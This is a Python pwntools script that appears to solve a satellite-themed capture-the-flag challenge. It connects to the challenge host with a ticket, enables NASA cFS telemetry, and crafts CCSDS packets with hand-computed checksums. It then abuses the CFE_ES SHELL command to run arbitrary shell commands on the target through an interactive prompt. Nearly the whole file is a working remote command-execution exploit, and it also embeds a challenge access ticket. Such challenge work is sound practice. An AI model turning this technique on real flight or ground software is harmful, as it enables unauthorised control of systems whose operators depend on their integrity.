#!/usr/bin/env python3
# Dependency: pip install pwntools
import logging
import re
import struct
from pwn import remote

logger = logging.getLogger('main')
#logging.basicConfig(format='[%(levelname)-5s] %(message)s', level=logging.INFO)

conn = remote('calendar.satellitesabove.me', 5061)
line = conn.recvline()
assert line == b'Ticket please:\n'
conn.sendline('ticket{foxtrot83312foxtrot:GBWTWo89p8AmKvRDrftVCAdkZss33s_45jYea__j3Kg7F-eXreencPal3uFdDF7m9A}')
line = conn.recvline().decode()
matches = re.match(
    r'Starting up CFS UDP Forwarding Service on tcp:([0-9.]+):([0-9]+)', line)
assert matches, "Unexpected line %r" % line
remote_addr, remote_port = matches.groups()
remote_port = int(remote_port)

def recv_from_first_conn():
    output = []
    while conn.can_recv(timeout=.1):
        line = conn.recvline().decode('utf-8', 'replace')
        logger.info("LOG: %r", line.rstrip())
        output.append(line)
    return ''.join(output)

def recv_from_conn_until(kw):
    output = recv_from_first_conn()
    while kw not in output:
        output = recv_from_first_conn()

recv_from_conn_until('Stop FLYWHEEL')
cfs_service = remote(remote_addr, remote_port)

def send_enable_telemetry():
    """
    Send a KIT_TO ENABLE_TELEMETRY command

    Address   Data                                             Ascii
    ---------------------------------------------------------------------------
    00000000: 18 80 C0 00 00 11 07 9A 31 32 37 2E 30 2E 30 2E          127.0.0.
    00000010: 31 00 00 00 00 00 00 00                          1
    """
    payload = bytearray()
    payload += struct.pack('>HHHBB', 6272, 49152, 17, 7, 0)
    # IP Address
    payload += b'127.0.0.1\x00\x00\x00\x00\x00\x00\x00'
    assert len(payload) == 0x18
    # Adjust checksum
    cksum = 0xff
    for x in payload:
        cksum ^= x
    payload[7] = cksum
    logger.info("Send enable telemetry")
    cfs_service.send_raw(payload)
    output = recv_from_conn_until('Telemetry output enabled for IP 127.0.0.1')

def send_shell_command(cmd):
    """
    Send a CFE_ES SHELL command

    Address   Data                                             Ascii
    ---------------------------------------------------------------------------
    00000000: 18 06 C0 00 00 81 03 E3 66 69 6E 64 20 2F 63 68          find /ch
    00000010: 61 6C 6C 65 6E 67 65 20 2D 65 78 65 63 20 6C 73  allenge -exec ls
    00000020: 20 2D 6C 64 20 7B 7D 20 2B 00 00 00 00 00 00 00   -ld {} +
    00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    00000040: 00 00 00 00 00 00 00 00 2F 63 66 2F 63 6D 64 2E          /cf/cmd.
    00000050: 74 6D 70 00 00 00 00 00 00 00 00 00 00 00 00 00  tmp
    00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    00000080: 00 00 00 00 00 00 00 00
    """
    # CCSDS Stream ID and sequence, Length, FuncCode, checksum
    payload = bytearray()
    payload += struct.pack('>HHHBB', 6150, 49152, 129, 3, 0)
    # Cmd
    cmd_bytes = cmd.encode()
    assert len(cmd_bytes) <= 0x40
    payload += cmd_bytes + b'\x00' * (0x40 - len(cmd_bytes))
    # output filename
    payload += b'/cf/cmd.tmp' + b'\x00' * 0x35
    assert len(payload) == 0x88
    # Adjust checksum
    cksum = 0xff
    for x in payload:
        cksum ^= x
    payload[7] = cksum
    logger.debug("Send cmd %r", cmd)
    cfs_service.send_raw(payload)
    while True:
        output = recv_from_first_conn()
        if 'Failed to invoke shell command:' in output:
            return 'FAILED'
        elif 'Invoked shell command:' in output:
            break

    # Now filter received telemetry packets
    received_output = []
    do_continue = True
    while do_continue:
        for stream_id, sequence, received_pkt in cfs_recv():
            if stream_id == 2056 and b'Invoked shell command:' in received_pkt:
                do_continue = False
                break
            if stream_id == 2063:
                received_output.append(received_pkt[5:])
    output = b''.join(received_output)
    # There is garbage in the end
    assert output.endswith(b'\n$\0'), output
    output = output[:-3].decode('utf-8', 'replace').rstrip()
    return output

def cfs_recv():
    """Receive from cFS service socket"""
    received_pkts = []
    while cfs_service.can_recv(timeout=.1):
        pkt = cfs_service.recvn(7)
        stream_id, sequence, length, seconds = struct.unpack('>HHHB', pkt)
        pkt = cfs_service.recvn(length)
        #logger.debug("Recv stream=%d, seq=%d [%#x]: %r",stream_id,sequence,length,pkt)
        received_pkts.append((stream_id, sequence, pkt))
    return received_pkts

send_enable_telemetry()
while True:
    cmd = input('$ ')
    if not cmd:
        break
    output = send_shell_command(cmd.strip())
    print(output)
